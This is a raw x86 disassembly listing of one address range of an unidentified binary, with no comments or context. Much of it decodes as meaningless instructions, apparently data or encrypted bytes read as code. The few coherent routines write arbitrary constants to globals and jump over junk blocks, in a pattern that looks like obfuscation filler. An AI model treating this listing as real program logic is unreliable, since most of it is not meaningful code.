  40db8d:	shr    BYTE PTR [eax+0x5e],1
  40db90:	and    edi,DWORD PTR [eax+0x7784a2a]
  40db96:	enter  0x178b,0x5f
  40db9a:	jmp    0x40db4f
  40db9c:	sub    BYTE PTR [esi-0x6fff4c11],0xac
  40dba3:	xchg   edx,eax
  40dba4:	cmp    DWORD PTR [edx-0x2c66f4ca],ebx
  40dbaa:	sbb    BYTE PTR [eax-0x71],al
  40dbad:	mul    DWORD PTR ds:0x756e2cb4
  40dbb3:	push   es
  40dbb4:	mov    al,0x3b
  40dbb6:	ror    DWORD PTR [edi],0x85
  40dbb9:	add    BYTE PTR [edx],0x0
  40dbbc:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x4540145c],0xfa012a99
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc1c
  40dbe0:	inc    edi
  40dbe1:	dec    ebx
  40dbe2:	ss rcr dh,1
  40dbe5:	push   ss
  40dbe6:	aaa    
  40dbe7:	imul   edx,DWORD PTR [eax],0x9f44186e
  40dbed:	push   ebx
  40dbee:	dec    ecx
  40dbef:	jmp    0x4cf3e697
  40dbf4:	retf   0x805a
  40dbf7:	pop    ecx
  40dbf8:	in     al,dx
  40dbf9:	retf   0x492a
  40dbfc:	mov    ebx,0x91802f39
  40dc01:	pop    edx
  40dc02:	loop   0x40dbdb
  40dc04:	add    al,BYTE PTR [ecx+0x4106f5c8]
  40dc0a:	es jne 0x40dbd1
  40dc0d:	cmp    eax,0xa1c5e54d
  40dc12:	dec    eax
  40dc13:	in     eax,0x6
  40dc15:	push   ds
  40dc16:	bound  ecx,QWORD PTR [ecx+ebp*1+0x10]
  40dc1a:	mov    esi,0xdbb67ae1
  40dc1f:	sbb    al,0x9a
  40dc21:	mov    ds:0x8e49e8fa,al
  40dc26:	je     0x40dbd1
  40dc28:	outs   dx,DWORD PTR ds:[esi]
  40dc29:	lds    ebp,FWORD PTR [edi-0x4f]
  40dc2c:	into   
  40dc2d:	dec    esi
  40dc2e:	pusha  
  40dc2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc30:	lods   al,BYTE PTR ds:[esi]
  40dc31:	and    eax,0x3929e597
  40dc36:	arpl   WORD PTR ds:0x6b9741b,cx
  40dc3c:	jg     0x40dc5e
  40dc3e:	repnz arpl WORD PTR [ecx],cx
  40dc41:	lds    ecx,FWORD PTR [esi]
  40dc43:	xchg   ebp,eax
  40dc44:	xor    DWORD PTR [edx+0xd],edi
  40dc47:	mov    ah,0xa2
  40dc49:	lods   al,BYTE PTR ds:[esi]
  40dc4a:	imul   DWORD PTR [eax+ebx*8-0x36]
  40dc4e:	(bad)  
  40dc4f:	xlat   BYTE PTR ds:[ebx]
  40dc50:	and    eax,0xe371b16
  40dc55:	test   BYTE PTR [esi-0x21],ch
  40dc58:	jb     0x40dc1d
  40dc5a:	test   DWORD PTR [ebx-0x75e870a7],0xac7fbe5c
  40dc64:	mov    edx,0xb71fa247
  40dc69:	ja     0x40dc63
  40dc6b:	or     bl,BYTE PTR [esi+0x23]
  40dc6e:	std    
  40dc6f:	inc    edi
  40dc70:	mov    bh,0x6e
  40dc72:	aad    0xb5
  40dc74:	or     eax,0x2a57b55
  40dc79:	mov    edi,0x824539f7
  40dc7e:	bound  ebp,QWORD PTR [ecx+edx*4-0x79b81e96]
  40dc85:	jecxz  0x40dc3b
  40dc87:	imul   ebx,DWORD PTR [ecx+eax*1+0x7e],0x3c8996fc
  40dc8f:	scas   eax,DWORD PTR es:[edi]
  40dc90:	(bad)  
  40dc91:	repz fsubr DWORD PTR [ebp+eax*1-0x7e]
  40dc96:	xor    eax,DWORD PTR [esi+0x5b]
  40dc99:	xlat   BYTE PTR ds:[ebx]
  40dc9a:	jo     0x40dc30
  40dc9c:	pop    esp
  40dc9d:	retf   
  40dc9e:	jne    0x40dccc
  40dca0:	inc    ebx
  40dca1:	dec    eax
  40dca2:	loop   0x40dcba
  40dca4:	popf   
  40dca5:	push   eax
  40dca6:	jl     0x40dc72
  40dca8:	mov    ah,0xcd
  40dcaa:	aam    0x69
  40dcac:	or     dh,BYTE PTR [eax-0x47]
  40dcaf:	cwde   
  40dcb0:	and    dl,BYTE PTR [ebx+0x6]
  40dcb3:	ret    
  40dcb4:	dec    ebp
  40dcb5:	test   al,0x53
  40dcb7:	out    0x9c,al
  40dcb9:	mov    ds:0xa765a1c6,eax
  40dcbf:	pop    ds
  40dcc0:	mov    bl,0x8
  40dcc2:	cs dec esi
  40dcc4:	adc    dl,BYTE PTR [ebp-0x6d]
  40dcc7:	adc    eax,0x1581ac30
  40dccc:	push   di
  40dcce:	out    dx,al
  40dccf:	jbe    0x40dd3f
  40dcd1:	bound  eax,QWORD PTR ds:[eax]
  40dcd4:	jae    0x40dd3d
  40dcd6:	add    cl,bh
  40dcd8:	mov    WORD PTR [edx],cs
  40dcda:	icebp  
  40dcdb:	(bad)  
  40dcdc:	retf   
  40dcdd:	int3   
  40dcde:	lock jnp 0x40dcd8
  40dce1:	enter  0x33b3,0x14
  40dce5:	lods   al,BYTE PTR ds:[esi]
  40dce6:	hlt    
  40dce7:	fs pop ds
  40dce9:	retf   
  40dcea:	out    0xee,al
  40dcec:	fstp   TBYTE PTR [eax+0x3eda7e58]
  40dcf2:	add    ecx,DWORD PTR [ebx+0x1f]
  40dcf5:	int3   
  40dcf6:	ret    
  40dcf7:	jle    0x40dd5c
  40dcf9:	test   eax,0x9cc1aba3
  40dcfe:	scas   al,BYTE PTR es:[edi]
  40dcff:	ss popf 
  40dd01:	aaa    
  40dd02:	push   eax
  40dd03:	shr    BYTE PTR [ebp+0x19],1
  40dd06:	aam    0x2b
  40dd08:	jbe    0x40dd09
  40dd0a:	fs ss call 0x111dff61
  40dd11:	mov    ds:0xebbc273f,eax
  40dd16:	fnstenv [edi-0x60fb1cce]
  40dd1c:	fdivr  QWORD PTR [eax-0x78]
  40dd1f:	mov    eax,0xaf38efc7
  40dd24:	hlt    
  40dd25:	push   0x6df16175
  40dd2a:	test   DWORD PTR [ebx+ebx*2+0x4a],esi
  40dd2e:	add    ch,cl
  40dd30:	cdq    
  40dd31:	xchg   ecx,eax
  40dd32:	inc    esp
  40dd34:	cmp    DWORD PTR [edx+0x78],ebp
  40dd37:	cli    
  40dd38:	ins    DWORD PTR es:[edi],dx
  40dd39:	fnstcw WORD PTR [edx-0x4d8a60bf]
  40dd3f:	mov    DWORD PTR [esi+0x18],0xcd632d79
  40dd46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd47:	call   0xa0552859
  40dd4c:	out    0x44,al
  40dd4e:	pop    es
  40dd4f:	xchg   ebp,eax
  40dd50:	add    edx,DWORD PTR [ebp-0x44]
  40dd53:	cmp    eax,0x6460faca
  40dd58:	dec    ecx
  40dd59:	into   
  40dd5a:	cld    
  40dd5b:	mov    ah,0xf7
  40dd5d:	fisubr WORD PTR [ebx]
  40dd5f:	retf   0x5630
  40dd62:	test   dl,ch
  40dd64:	cmc    
  40dd65:	jmp    0xabda81b2
  40dd6a:	mov    dl,0x29
  40dd6c:	sbb    ebp,esp
  40dd6e:	idiv   BYTE PTR [eax-0x9]
  40dd71:	test   eax,0x35b0493d
  40dd76:	xchg   edx,eax
  40dd77:	imul   ebp,DWORD PTR [edi+0x48],0xfffffff5
  40dd7b:	jnp    0x40dde1
  40dd7d:	scas   al,BYTE PTR es:[edi]
  40dd7e:	mov    edi,0x594ae0f9
  40dd83:	sbb    BYTE PTR [edx],bh
  40dd85:	sti    
  40dd86:	retf   0x5223
  40dd89:	mov    edx,0xb502a915
  40dd8e:	sbb    edi,DWORD PTR [ecx-0x6893bcb]
  40dd94:	and    DWORD PTR [ebx],ebx
  40dd96:	adc    ch,BYTE PTR [edi+ebp*8]
  40dd99:	(bad)  
  40dd9a:	push   ebp
  40dd9b:	clc    
  40dd9c:	or     edi,DWORD PTR [edx+0x7f119d7c]
  40dda2:	mov    al,0x8a
  40dda4:	mov    dh,dl
  40dda6:	sub    al,al
  40dda8:	stos   BYTE PTR es:[edi],al
  40dda9:	stos   BYTE PTR es:[edi],al
  40ddaa:	sub    eax,0xacbf6b89
  40ddaf:	(bad)  
  40ddb0:	pop    es
  40ddb1:	sub    DWORD PTR [ebp-0x2e],esi
  40ddb4:	fstp   DWORD PTR [ebp+0x779be40]
  40ddba:	jle    0x40ddf3
  40ddbc:	out    0xc0,eax
  40ddbe:	xchg   BYTE PTR [ebx-0x445f2957],ch
  40ddc4:	jb     0x40dda3
  40ddc6:	stos   DWORD PTR es:[edi],eax
  40ddc7:	jb     0x40ddcf
  40ddc9:	add    al,0x1d
  40ddcb:	aad    0xd4
  40ddcd:	push   cs
  40ddce:	jmp    0xd540ec94
  40ddd3:	cmp    eax,0x930df436
  40ddd8:	cmp    DWORD PTR [edx+eiz*8-0x20],ebp
  40dddc:	push   cs
  40dddd:	or     eax,DWORD PTR [edi+esi*2]
  40dde0:	sar    BYTE PTR [edx-0x3c187999],1
  40dde6:	js     0x40ddf9
  40dde8:	xchg   DWORD PTR [esi-0x7a],esp
  40ddeb:	dec    ebx
  40ddec:	fadd   st,st(4)
  40ddee:	into   
  40ddef:	mov    ds:0x34fcd0bc,al
  40ddf4:	jb     0x40dddd
  40ddf6:	out    0xf3,al
  40ddf8:	mov    dl,0x94
  40ddfa:	xchg   DWORD PTR [esi+0x3e37d96],esi
  40de00:	mov    ecx,0xd0a63d14
  40de05:	mov    eax,ds:0x6bf430c5
  40de0a:	int3   
  40de0b:	jp     0x40ddac
  40de0d:	cmp    eax,0xb0d65556
  40de12:	and    BYTE PTR [ebx-0xb],0xdb
  40de16:	outs   dx,BYTE PTR ds:[esi]
  40de17:	adc    al,0xdb
  40de19:	mov    ch,0xe8
  40de1b:	xor    dl,ah
  40de1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de1e:	mov    al,0x3
  40de20:	(bad)  
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43369f,0x0
  40de5a:	mov    eax,ds:0x43369f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43369f,eax
  40de65:	cmp    DWORD PTR ds:0x43369f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43369f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4336ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	mul    DWORD PTR [edi]
  40dea7:	mov    esi,?
  40dea9:	lods   al,BYTE PTR ds:[esi]
  40deaa:	mov    edx,0x127e7e9c
  40deaf:	jg     0x40df2f
  40deb1:	jle    0x40de3c
  40deb3:	push   esi
  40deb4:	repnz test cl,dl
  40deb7:	xor    ebx,ebx
  40deb9:	push   0x9b89ed49
  40debe:	rol    BYTE PTR [edi],cl
  40dec0:	inc    edx
  40dec1:	out    dx,eax
  40dec2:	xchg   ebp,eax
  40dec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dec4:	retf   
  40dec5:	mov    fs,WORD PTR [edi+0x13aa00e3]
  40decb:	inc    BYTE PTR [edi-0x640cdff7]
  40ded1:	cdq    
  40ded2:	pop    ds
  40ded3:	xor    bh,BYTE PTR [eax]
  40ded5:	pop    eax
  40ded6:	in     eax,dx
  40ded7:	inc    ebx
  40ded8:	push   cs
  40ded9:	jp     0x40dee3
  40dedb:	jae    0x40df1f
  40dedd:	mov    esi,0xb208122
  40dee2:	lock ins BYTE PTR es:[edi],dx
  40dee4:	sub    bl,cl
  40dee6:	test   eax,0xd998ea53
  40deeb:	aad    0x36
  40deed:	and    BYTE PTR [ecx+0x5f1215fa],ch
  40def3:	push   es
  40def4:	pop    ss
  40def5:	into   
  40def6:	(bad)  
  40def7:	xor    DWORD PTR [ecx],eax
  40def9:	cld    
  40defa:	dec    ebp
  40defb:	pop    edx
  40defc:	push   ebx
  40defd:	fs cmc 
  40deff:	cmp    bh,al
  40df01:	jg     0x40defe
  40df03:	mov    ch,0x79
  40df05:	js     0x40df07
  40df07:	repz (bad) [ebp+0x7b7d9901]
  40df0e:	sbb    ebx,DWORD PTR [edx+0x13]
  40df11:	fcom   QWORD PTR [esi-0x78]
  40df14:	adc    al,0xf5
  40df16:	pop    es
  40df17:	inc    ecx
  40df18:	fnclex 
  40df1a:	iret   
  40df1b:	pop    esi
  40df1c:	sub    BYTE PTR [esi+0x6ed34d87],dl
  40df22:	fwait
  40df23:	pop    ecx
  40df24:	repz lahf 
  40df26:	pop    es
  40df27:	in     al,dx
  40df28:	mov    esi,0x833d12cc
  40df2d:	dec    DWORD PTR [edx-0x5c]
  40df30:	popa   
  40df31:	add    al,0x80
  40df33:	mov    al,ds:0x9b3ed63
  40df38:	into   
  40df39:	sahf   
  40df3a:	mov    gs,ebx
  40df3c:	dec    esi
  40df3d:	imul   ebx,DWORD PTR [eax+0x19],0x811ba5fa
  40df44:	mov    al,ds:0x8071f972
  40df49:	loop   0x40dee9
  40df4b:	repz in al,dx
  40df4d:	test   DWORD PTR [esi+0x221be856],eax
  40df53:	ret    
  40df54:	pushf  
  40df55:	sbb    eax,0xe48956bf
  40df5a:	in     al,0xd3
  40df5c:	leave  
  40df5d:	lods   eax,DWORD PTR ds:[esi]
  40df5e:	fdiv   st,st(0)
  40df60:	dec    edi
  40df61:	scas   eax,DWORD PTR es:[edi]
  40df62:	push   es
  40df63:	sub    eax,0x78879e1b
  40df68:	jp     0x40df62
  40df6a:	cli    
  40df6b:	popa   
  40df6c:	fiadd  DWORD PTR [esi-0x23]
  40df6f:	inc    esi
  40df70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df71:	mul    DWORD PTR [esi+0x5d8d62bd]
  40df77:	add    eax,0xe856be51
  40df7c:	mov    ecx,0x3b23cee5
  40df81:	in     al,0x51
  40df83:	mov    al,0x99
  40df85:	int3   
  40df86:	test   DWORD PTR [edi+edi*8+0x64090bb7],esp
  40df8d:	ja     0x40e002
  40df8f:	cwde   
  40df90:	or     al,0x11
  40df92:	push   cs
  40df93:	daa    
  40df94:	cmp    ebp,DWORD PTR [ecx+0x50]
  40df97:	sti    
  40df98:	adc    esi,DWORD PTR [eax-0x4a]
  40df9b:	hlt    
  40df9c:	in     eax,0xb
  40df9e:	jb     0x40dfaa
  40dfa0:	xchg   ebp,eax
  40dfa1:	mov    bl,0xa1
  40dfa3:	add    bh,BYTE PTR [ebp-0x43676197]
  40dfa9:	mov    ch,0x27
  40dfab:	add    esp,DWORD PTR [esi+0x28]
  40dfae:	pusha  
  40dfaf:	xor    DWORD PTR [eax],esp
  40dfb1:	inc    ebp
  40dfb2:	push   cs
  40dfb3:	pusha  
  40dfb4:	sub    DWORD PTR [ebx],ebp
  40dfb6:	inc    ebx
  40dfb7:	xchg   esi,eax
  40dfb8:	push   0xa54f354b
  40dfbd:	and    ebp,ebx
  40dfbf:	adc    BYTE PTR [ebx+ebp*1+0x5e],bl
  40dfc3:	pushf  
  40dfc4:	(bad)  
  40dfc5:	arpl   WORD PTR [edi+eax*8+0x726a29b6],sp
  40dfcc:	cmc    
  40dfcd:	das    
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433697,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4336eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	xlat   BYTE PTR ds:[ebx]
  40e004:	jp     0x40dff1
  40e006:	popa   
  40e007:	pop    esi
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40dfb9
  40e010:	repnz adc eax,0xde6e4410
  40e016:	dec    edx
  40e017:	adc    eax,0xdeea7ecd
  40e01c:	nop
  40e01d:	mov    ah,0xbf
  40e01f:	lock add esp,DWORD PTR [eax]
  40e022:	outs   dx,BYTE PTR ds:[esi]
  40e023:	inc    ecx
  40e024:	jnp    0x40e0a3
  40e026:	idiv   BYTE PTR [esi+0x7d]
  40e029:	ja     0x40dfe2
  40e02b:	sbb    ecx,edx
  40e02d:	leave  
  40e02e:	jae    0x40e084
  40e030:	adc    DWORD PTR [ecx],esp
  40e032:	aaa    
  40e033:	mov    ch,0xf3
  40e035:	sbb    DWORD PTR ds:0x93f9c16e,eax
  40e03b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e03c:	stos   DWORD PTR es:[edi],eax
  40e03d:	mov    esi,0xdb2200fa
  40e042:	sub    BYTE PTR ds:[eax+0x5d76a9c8],ch
  40e049:	cmp    BYTE PTR [eax+0x69f5e528],cl
  40e04f:	jecxz  0x40e002
  40e051:	fwait
  40e052:	lods   al,BYTE PTR ds:[esi]
  40e053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e054:	push   ebx
  40e055:	stc    
  40e056:	ret    
  40e057:	repnz sahf 
  40e059:	jp     0x40e0b0
  40e05b:	jo     0x40e068
  40e05d:	and    eax,ecx
  40e05f:	mov    ch,bh
  40e061:	aad    0x5c
  40e063:	pop    edi
  40e064:	mov    edx,0x21def91a
  40e069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e06a:	sub    eax,0x87fa5096
  40e06f:	add    al,0x6
  40e071:	cwde   
  40e072:	or     al,0x9c
  40e074:	add    dh,al
  40e076:	push   esp
  40e077:	push   ebx
  40e078:	pop    ds
  40e079:	and    BYTE PTR ds:0x8f400d48,0x50
  40e080:	les    ecx,FWORD PTR [edx+0x7d42b636]
  40e086:	js     0x40e017
  40e088:	sti    
  40e089:	or     BYTE PTR [edx+0x5fe44bc9],0xca
  40e090:	sahf   
  40e091:	jo     0x40e0e3
  40e093:	fsincos 
  40e095:	mov    fs,WORD PTR [eax-0x707a800b]
  40e09b:	or     DWORD PTR [edi+0x12736523],ebp
  40e0a1:	sub    eax,0x41c1d0f7
  40e0a6:	sbb    eax,0xa7ae9e25
  40e0ab:	jmp    0x603d:0x922b9f24
  40e0b2:	sahf   
  40e0b3:	add    bh,cl
  40e0b5:	lahf   
  40e0b6:	inc    eax
  40e0b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0b8:	aas    
  40e0b9:	jo     0x40e0e8
  40e0bb:	es jmp 0x5123:0xabc90074
  40e0c3:	jge    0x40e0cc
  40e0c5:	and    eax,edx
  40e0c7:	imul   BYTE PTR [esi-0x11]
  40e0ca:	jnp    0x40e0e7
  40e0cc:	cmp    eax,0x275a4f01
  40e0d1:	pusha  
  40e0d2:	retf   0x5e0
  40e0d5:	data16 repz (bad) 
  40e0d8:	stc    
  40e0d9:	mov    dl,0x46
  40e0db:	psubd  mm4,QWORD PTR [edx+0x1c]
  40e0df:	jmp    0x824d:0x4f63ecaa
  40e0e6:	inc    ebx
  40e0e7:	or     bl,dh
  40e0e9:	cmp    eax,0xf2a048cf
  40e0ee:	cmp    al,0x92
  40e0f0:	int3   
  40e0f1:	arpl   WORD PTR [eax+eiz*1+0x630407be],si
  40e0f8:	cdq    
  40e0f9:	fcom   DWORD PTR [esi]
  40e0fb:	mov    dl,0xc4
  40e0fd:	xchg   edx,eax
  40e0fe:	sub    al,BYTE PTR [eax]
  40e100:	es jmp ecx
  40e103:	dec    esp
  40e104:	out    dx,eax
  40e105:	test   BYTE PTR [ecx+0x5de7d2cc],0x66
  40e10c:	or     al,0x5b
  40e10e:	data16 sub bh,bl
  40e111:	inc    ebx
  40e112:	std    
  40e113:	or     dh,ch
  40e115:	cmp    al,0xf8
  40e117:	mov    gs,WORD PTR [esi-0x13]
  40e11a:	or     al,0xb0
  40e11c:	mov    bh,0xbe
  40e11e:	fcmovnb st,st(1)
  40e120:	jne    0x40e0f3
  40e122:	(bad)  
  40e123:	push   esp
  40e124:	and    BYTE PTR [edx-0x3cc387e6],ch
  40e12a:	push   ecx
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4336a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4336ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	gs arpl bx,si
  40e15d:	and    DWORD PTR [edx-0x66],esi
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e17d
  40e167:	(bad)  
  40e168:	jo     0x40e115
  40e16a:	dec    edx
  40e16b:	test   eax,0xfe935771
  40e170:	pop    esp
  40e171:	inc    esi
  40e172:	mov    bh,0xdb
  40e174:	pop    ss
  40e175:	inc    esi
  40e176:	fcmovnu st,st(0)
  40e178:	ret    0xab76
  40e17b:	ror    BYTE PTR [esi+0x32],1
  40e17e:	adc    DWORD PTR [ebx],esp
  40e180:	cdq    
  40e181:	stos   DWORD PTR es:[edi],eax
  40e182:	and    al,0x7c
  40e185:	xor    ch,dl
  40e187:	mov    bh,cl
  40e189:	xor    bl,bh
  40e18b:	aam    0xea
  40e18d:	outs   dx,BYTE PTR ds:[esi]
  40e18e:	es pop ss
  40e190:	xor    esi,DWORD PTR [eax]
  40e192:	and    eax,ecx
  40e194:	das    
  40e195:	ret    0xb44
  40e198:	lods   al,BYTE PTR ds:[esi]
  40e199:	repnz cwde 
  40e19b:	push   esi
  40e19c:	mov    WORD PTR [esi],?
  40e19e:	add    DWORD PTR [eax+ebx*2-0x13931a97],0x9f68848e
  40e1a9:	jmp    0x76490624
  40e1ae:	sub    ebx,ecx
  40e1b0:	jae    0x40e19d
  40e1b2:	neg    DWORD PTR [edi]
  40e1b4:	clc    
  40e1b5:	daa    
  40e1b6:	psubusb mm0,mm1
  40e1b9:	xchg   ebp,eax
  40e1ba:	nop
  40e1bb:	mov    ecx,0x68cc5448
  40e1c0:	lahf   
  40e1c1:	mov    edx,0xee70f8da
  40e1c6:	stos   BYTE PTR es:[edi],al
  40e1c7:	cmp    eax,0x76f26593
  40e1cc:	xor    BYTE PTR [edx+ebp*4],bh
  40e1cf:	dec    esi
  40e1d0:	nop
  40e1d1:	add    edi,ebp
  40e1d3:	scas   eax,DWORD PTR es:[edi]
  40e1d4:	jae    0x40e236
  40e1d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1d7:	sbb    al,0xfc
  40e1d9:	fs adc eax,0x17fc97c5
  40e1df:	out    dx,al
  40e1e0:	xor    bh,dl
  40e1e2:	pop    esi
  40e1e3:	inc    eax
  40e1e4:	push   ebp
  40e1e5:	mov    eax,0x8983b26
  40e1ea:	outs   dx,BYTE PTR ds:[esi]
  40e1eb:	stos   DWORD PTR es:[edi],eax
  40e1ec:	fcom   QWORD PTR [eax+eax*8]
  40e1ef:	xchg   edi,eax
  40e1f0:	cs push edi
  40e1f2:	mov    esi,DWORD PTR [esi+0x2f364b51]
  40e1f8:	mov    cl,ch
  40e1fa:	xor    al,0xf2
  40e1fc:	xchg   edi,eax
  40e1fd:	mov    ds:0x39d813da,al
  40e202:	rol    BYTE PTR [ebp-0x8fc2202],1
  40e208:	sub    ecx,edx
  40e20a:	mov    DWORD PTR [eax-0x2ee51a07],ecx
  40e210:	push   esp
  40e211:	cmp    dl,BYTE PTR [eax+edx*1]
  40e214:	and    al,0xb0
  40e216:	in     eax,dx
  40e217:	push   esi
  40e218:	icebp  
  40e219:	mov    al,ds:0xd6d893a7
  40e21e:	sub    DWORD PTR [esp+eax*8-0x102deab8],ebp
  40e225:	adc    eax,0x74859e53
  40e22a:	cmp    eax,0xfdbadb3
  40e22f:	push   ebx
  40e230:	mov    esi,0x72fff9ef
  40e235:	xchg   ebx,eax
  40e236:	or     al,0x95
  40e238:	cmp    al,0xb3
  40e23a:	mov    esp,0x13ae8116
  40e23f:	icebp  
  40e240:	mov    ds:0xe8c2e9b4,al
  40e245:	sbb    DWORD PTR [eax],0xfffffff3
  40e248:	repz enter 0x59c4,0x14
  40e24d:	dec    edi
  40e24e:	push   esp
  40e24f:	mov    esi,0xd5377739
  40e254:	mov    ch,0x2
  40e256:	or     eax,0x10dbad8b
  40e25b:	nop
  40e25c:	xchg   DWORD PTR [edx+0x3b076486],ebp
  40e262:	mov    edx,0xa716f987
  40e267:	pop    ds
  40e268:	bound  ecx,QWORD PTR ds:0x511c0d72
  40e26e:	pop    ebx
  40e26f:	mov    al,ds:0x240eb184
  40e274:	out    0x8f,eax
  40e276:	dec    edi
  40e277:	lods   eax,DWORD PTR ds:[esi]
  40e278:	mov    al,0x98
  40e27a:	iret   
  40e27b:	scas   eax,DWORD PTR es:[edi]
  40e27c:	sub    DWORD PTR [edi-0x1fda90f4],ecx
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43360b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4336e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43372b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433697,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43360b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4336d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43369f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43361b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43371f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43372b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4336df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43371b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4336d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433653,0x43365f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4336a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4336d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4336d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433603,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433603,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433697,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433603,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4336af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43372b
  40e3da:	and    DWORD PTR ds:0x43360b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433663,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433713
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
